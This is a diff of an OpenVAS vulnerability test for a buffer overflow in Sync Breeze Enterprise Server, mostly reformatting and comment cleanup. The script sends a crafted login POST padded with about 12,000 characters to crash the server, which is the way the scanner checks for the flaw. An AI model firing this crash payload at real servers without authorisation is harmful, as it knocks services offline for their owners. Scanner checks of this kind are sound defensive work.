@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_sync_breeze_enterprise_server_bof_vuln.nasl 6586 2017-07-07 06:23:25Z cfischer $
+# $Id: gb_sync_breeze_enterprise_server_bof_vuln.nasl 11026 2018-08-17 08:52:26Z cfischer $
 #
 # Sync Breeze Enterprise Server Buffer Overflow Vulnerability
 #
@@ -29,83 +29,71 @@ CPE = "cpe:/a:sync:sync_breeze_enterprise";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.809059");
-  script_version("$Revision: 6586 $");
+  script_version("$Revision: 11026 $");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-07 08:23:25 +0200 (Fri, 07 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-17 10:52:26 +0200 (Fri, 17 Aug 2018) $");
   script_tag(name:"creation_date", value:"2016-10-10 10:19:35 +0530 (Mon, 10 Oct 2016)");
   script_tag(name:"qod_type", value:"remote_vul");
   script_name("Sync Breeze Enterprise Server Buffer Overflow Vulnerability");
 
-  script_tag(name: "summary" , value:"The host is running Sync Breeze Enterprise
+  script_tag(name:"summary", value:"The host is running Sync Breeze Enterprise
   Server and is prone to buffer overflow vulnerability.");
 
-  script_tag(name: "vuldetect" , value:"Send a crafted request via HTTP POST
+  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP POST
   and check whether it is able to crash the server or not.");
 
-  script_tag(name: "insight" , value:"The flaw is due to an error when processing
+  script_tag(name:"insight", value:"The flaw is due to an error when processing
   web requests and can be exploited to cause a buffer overflow via an overly long
   string passed to 'Login' request.");
 
-  script_tag(name: "impact" , value:"Successful exploitation may allow remote
+  script_tag(name:"impact", value:"Successful exploitation may allow remote
   attackers to cause the application to crash, creating a denial-of-service
   condition.
 
   Impact Level: Application");
 
-  script_tag(name: "affected" , value:"Sync Breeze Enterprise version 8.9.24");
+  script_tag(name:"affected", value:"Sync Breeze Enterprise version 8.9.24");
 
-  script_tag(name: "solution" , value:"No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore. General solution options
+  script_tag(name:"solution", value:"No known solution was made available for at least one year
+  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options
   are to upgrade to a newer release, disable respective features, remove the product or replace the product
   by another one.");
 
   script_tag(name:"solution_type", value:"WillNotFix");
 
-  script_xref(name : "URL" , value : "http://www.syncbreeze.com");
-  script_xref(name : "URL" , value : "https://www.exploit-db.com/exploits/40456");
-  script_xref(name : "URL" , value : "https://packetstormsecurity.com/files/138994");
+  script_xref(name:"URL", value:"http://www.syncbreeze.com");
+  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40456");
+  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/138994");
 
   script_category(ACT_DENIAL);
   script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
   script_family("Denial of Service");
   script_dependencies("gb_sync_breeze_enterprise_detect.nasl", "os_detection.nasl");
-  script_mandatory_keys("Sync/Breeze/Enterprise/installed", "Host/runs_windows");  
+  script_mandatory_keys("Sync/Breeze/Enterprise/installed", "Host/runs_windows");
   script_require_ports("Services/www", 80);
+
   exit(0);
 }
-
 
 include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
-## Variable Initialization
-buf = "";
-host = "";
-nseh = "";
-seh = "";
-http_port = 0;
-sndReq = "";
-rcvRes = "";
-
-## Get HTTP Port
 if(!http_port = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-## Cross Confirm to avoid FP
 if(http_is_dead(port:http_port)){
   exit(0);
 }
 
-## Get host
 host = http_host_name(port:http_port);
 if(!host){
   exit(0);
 }
 
-## Constructing crafted data
 exploit = crap(data: "0x41", length:12292);
 PAYLOAD = "username=test" + "&password=test" + "\r\n" + exploit;
 
@@ -120,7 +108,6 @@ for (j=0;j<5;j++)
 {
   rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
 
-  ## confirm the exploit
   if(http_is_dead(port:http_port))
   {
     security_message(http_port);
